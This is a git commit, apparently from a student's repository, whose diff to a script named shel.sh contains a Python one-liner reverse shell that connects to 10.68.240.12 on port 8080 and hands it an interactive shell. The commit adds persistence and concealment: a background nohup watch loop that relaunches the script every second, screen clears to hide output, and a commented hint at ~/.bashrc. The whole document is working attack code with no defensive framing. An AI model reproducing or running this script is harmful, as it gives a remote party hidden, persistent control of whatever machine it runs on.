964daf68d8749c67b35ccca51eb7130a39a9d5ee
Brehm mathis <mathis.brehm@epitech.eu>
2022-11-15 16:49:27 +0100

    revershel

--- shel.sh
+++ shel.sh
@@ -1,4 +1,8 @@
 #!/bin/sh
+#rm shel.sh
+clear
+nohup watch -n 1 sh ./shel.sh &
 python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.68.240.12",8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
+clear
 
-rm shel.sh
+#~/.bashrc test
